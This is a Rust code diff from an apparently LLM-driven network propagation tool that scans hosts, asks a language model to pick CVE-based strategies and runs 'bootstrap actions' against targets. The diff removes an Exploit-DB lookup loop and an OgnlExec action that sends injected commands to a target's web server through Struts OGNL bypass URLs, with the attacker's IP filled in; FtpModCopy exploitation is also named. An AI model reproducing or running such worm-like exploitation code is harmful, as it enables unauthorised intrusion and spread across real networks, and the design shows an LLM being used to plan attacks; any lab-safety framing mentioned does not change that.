@@ -18,11 +18,11 @@ use std::path::{Path, PathBuf};
 use anyhow::Result;
 use futures::stream::{self, StreamExt};
 use physarum_llm::{
-    ArtifactType, BootstrapAction, DiscoveryQuery, EnrichmentCapability, ExecutionResultSummary,
-    LlmAttemptEvidence, LlmClient, NextAction, OsHint, OsHintSource, PatternFindingSummary,
-    PolicyDecision, PolicyGate, PolicyRejectionReason, PortScan, PortState, PropagationMethod,
-    PropagationMethodClass, RejectedStrategy, TemplateMeta, TemplateSelectionQuery,
-    TransportProtocol, VulnerabilitySource, MAX_ATTEMPTS,
+    ArtifactType, BootstrapAction, DiscoveryQuery, ExecutionResultSummary, LlmAttemptEvidence,
+    LlmClient, NextAction, OsHint, OsHintSource, PatternFindingSummary, PolicyDecision, PolicyGate,
+    PolicyRejectionReason, PortScan, PortState, PropagationMethod, PropagationMethodClass,
+    RejectedStrategy, TemplateMeta, TemplateSelectionQuery, TransportProtocol, VulnerabilitySource,
+    MAX_ATTEMPTS,
 };
 use physarum_scanner::{
     effective_stimulus_ports, result_from_open_port, EvidenceSource as ScanEvidenceSource,
@@ -191,13 +191,6 @@ pub async fn run(
             vec![ranked_candidates[idx].clone()]
         };
 
-        // Expose Exploit-DB enrichment capability when the index is non-empty.
-        let enrichment_caps: Vec<EnrichmentCapability> = if !crate::exploit_db::index().is_empty() {
-            vec![EnrichmentCapability::ExploitDb]
-        } else {
-            vec![]
-        };
-
         let query = DiscoveryQuery {
             target: IpAddr::V4(target),
             ports: port_scans.clone(),
@@ -213,12 +206,10 @@ pub async fn run(
             pattern_findings: attempt_findings,
             source_ip: local_ip.map(IpAddr::V4),
             ephemeral_pubkey: ephemeral_key.as_ref().map(|k| k.pubkey.clone()),
-            available_enrichment_capabilities: enrichment_caps,
-            enrichment_result: None,
         };
 
-        // ── Query LLM (Turn 2a) ───────────────────────────────────────────────
-        let mut strategy = match client.query_propagation(&query).await {
+        // ── Query LLM ────────────────────────────────────────────────────────
+        let strategy = match client.query_propagation(&query).await {
             Ok(s) => s,
             Err(e) => {
                 tracing::warn!(%target, attempt = attempt_number, err = %e, "LLM query error");
@@ -241,92 +232,10 @@ pub async fn run(
                     strategy_confidence: 0.0,
                     target_port: None,
                     cve_candidate_ids: cve_ids.clone(),
-                    enrichment_requested: false,
-                    exploit_reference_id: None,
                 });
                 continue;
             }
         };
-
-        // ── Enrichment round-trip (Turn 2b, at most once per attempt) ─────────
-        // When the LLM requests Exploit-DB enrichment, perform the local lookup
-        // and call the LLM again with the result. The second response must not
-        // request another enrichment (bounded to one round-trip per attempt).
-        let mut enrichment_requested = false;
-        let mut exploit_reference_id: Option<String> = None;
-
-        if let Some(enrich_req) = strategy.enrichment_request.take() {
-            enrichment_requested = true;
-            tracing::info!(
-                %target, attempt = attempt_number,
-                cve_id = %enrich_req.cve_id,
-                reason = %enrich_req.reason,
-                "LLM requested Exploit-DB enrichment"
-            );
-
-            let enrichment = crate::exploit_db::lookup(enrich_req);
-
-            // Record the first matching reference ID for lineage.
-            exploit_reference_id = enrichment
-                .references
-                .first()
-                .map(|r| r.exploit_reference_id.clone());
-
-            tracing::info!(
-                %target, attempt = attempt_number,
-                status = ?enrichment.status,
-                refs = enrichment.references.len(),
-                "Exploit-DB lookup complete"
-            );
-
-            // Rebuild the query with enrichment_result and call LLM again (Turn 2b).
-            let enriched_query = DiscoveryQuery {
-                enrichment_result: Some(enrichment),
-                available_enrichment_capabilities: vec![], // no further enrichment this attempt
-                ..query.clone()
-            };
-
-            match client.query_propagation(&enriched_query).await {
-                Ok(s) => {
-                    strategy = s;
-                    // Discard any nested enrichment_request — one round-trip only.
-                    strategy.enrichment_request = None;
-                }
-                Err(e) => {
-                    tracing::warn!(
-                        %target, attempt = attempt_number, err = %e,
-                        "LLM Turn 2b (post-enrichment) query error"
-                    );
-                    lineage.record_llm_attempt(LlmAttemptEvidence {
-                        target: target.to_string(),
-                        attempt_number,
-                        stimulus_source: stimulus.to_string(),
-                        method_class: PropagationMethodClass::NoPath,
-                        artifact_type: ArtifactType::None,
-                        policy_decision: PolicyDecision::Rejected {
-                            reason: PolicyRejectionReason::Custom(format!(
-                                "LLM Turn 2b error: {e}"
-                            )),
-                            rule: "llm_client".into(),
-                        },
-                        execution_result: ExecutionResultSummary::Skipped {
-                            reason: format!("LLM Turn 2b failed: {e}"),
-                        },
-                        reasoning_summary: format!(
-                            "LLM Turn 2b query error on attempt {attempt_number}: {e}"
-                        ),
-                        next_action: NextAction::RetryWithLlm,
-                        strategy_id: String::new(),
-                        strategy_confidence: 0.0,
-                        target_port: None,
-                        cve_candidate_ids: cve_ids.clone(),
-                        enrichment_requested,
-                        exploit_reference_id: exploit_reference_id.clone(),
-                    });
-                    continue;
-                }
-            }
-        }
 
         let strategy_id = strategy_fingerprint(&strategy);
         let method_class = method_class_of(&strategy.method);
@@ -352,8 +261,6 @@ pub async fn run(
                 strategy_confidence: strategy.confidence,
                 target_port: None,
                 cve_candidate_ids: cve_ids.clone(),
-                enrichment_requested,
-                exploit_reference_id: exploit_reference_id.clone(),
             });
             return Ok(LlmOutcome::DeadEnd);
         }
@@ -388,8 +295,6 @@ pub async fn run(
                 strategy_confidence: strategy.confidence,
                 target_port: method_port(&strategy.method),
                 cve_candidate_ids: cve_ids.clone(),
-                enrichment_requested,
-                exploit_reference_id: exploit_reference_id.clone(),
             });
             continue;
         }
@@ -444,8 +349,6 @@ pub async fn run(
             strategy_confidence: strategy.confidence,
             target_port: method_port(&strategy.method),
             cve_candidate_ids: cve_ids.clone(),
-            enrichment_requested,
-            exploit_reference_id,
         });
 
         if succeeded {
@@ -1701,64 +1604,6 @@ async fn execute_step(
                 "Custom action — skipped (requires explicit lab policy)"
             );
             StepResult::Simulated
-        }
-
-        BootstrapAction::OgnlExec {
-            commands,
-            port,
-            path_prefix,
-            extra_headers,
-        } => {
-            let p = port.unwrap_or(8080);
-            let prefix = path_prefix.as_deref().unwrap_or("/");
-            let ip_str = source_ip.map(|ip| ip.to_string()).unwrap_or_default();
-
-            tracing::info!(
-                %target, port = p, prefix, cmds = commands.len(),
-                "OgnlExec — OGNL multi-command delivery"
-            );
-
-            let client = reqwest::Client::new();
-
-            for (i, raw_cmd) in commands.iter().enumerate() {
-                let cmd = raw_cmd.replace("<source_ip>", &ip_str);
-                let ognl_url = format!(
-                    "http://{}:{}{}?id={}",
-                    target,
-                    p,
-                    prefix,
-                    build_struts_bypass_ognl(&cmd)
-                );
-
-                tracing::info!(%target, cmd_index = i, cmd = %cmd, "OgnlExec POST");
-
-                let mut req = client.post(&ognl_url);
-                for (k, v) in extra_headers {
-                    req = req.header(k.as_str(), v.as_str());
-                }
-
-                match tokio::time::timeout(
-                    tokio::time::Duration::from_millis(timeout_ms),
-                    req.send(),
-                )
-                .await
-                {
-                    Ok(Ok(r)) => {
-                        tracing::info!(
-                            %target, cmd_index = i, status = r.status().as_u16(),
-                            "OgnlExec command accepted"
-                        );
-                    }
-                    Ok(Err(e)) => {
-                        return StepResult::Failed(format!("OgnlExec cmd[{i}] HTTP error: {e}"));
-                    }
-                    Err(_) => {
-                        return StepResult::Failed(format!("OgnlExec cmd[{i}] timeout"));
-                    }
-                }
-            }
-
-            StepResult::Ok
         }
 
         BootstrapAction::FtpModCopy {
